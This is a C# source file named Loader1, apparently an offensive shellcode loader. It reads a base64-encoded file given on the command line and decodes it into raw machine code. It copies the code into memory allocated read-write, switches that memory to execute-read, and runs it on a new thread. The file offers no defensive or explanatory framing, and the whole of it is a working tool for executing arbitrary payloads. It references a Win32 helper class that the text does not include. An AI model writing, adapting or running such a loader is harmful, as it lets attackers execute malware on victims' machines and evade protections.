using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

namespace Loader1
{
    internal class Program
    {
        static void Main(string[] args)
        {
            if (args.Length < 1)
            {
                Console.WriteLine("Usage: Loader1 <base64_file_path>");
                return;
            }

            string base64FilePath = args[0];

            byte[] shellcode;
            string base64Shellcode = File.ReadAllText(base64FilePath);
            shellcode = Convert.FromBase64String(base64Shellcode);

            var baseAddress = Win32.VirtualAlloc(
                IntPtr.Zero,
                (uint)shellcode.Length,
                Win32.AllocationType.Commit | Win32.AllocationType.Reserve,
                Win32.MemoryProtection.ReadWrite);

            Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

            Win32.VirtualProtect(
                baseAddress,
                (uint)shellcode.Length,
                Win32.MemoryProtection.ExecuteRead,
                out _);

            Thread thread = new Thread(() =>
            {
                IntPtr functionPointer = baseAddress;
                var functionDelegate = Marshal.GetDelegateForFunctionPointer(functionPointer, typeof(ThreadStart));
                functionDelegate.DynamicInvoke();
            });

            thread.Start();
            thread.Join();
        }
    }
}

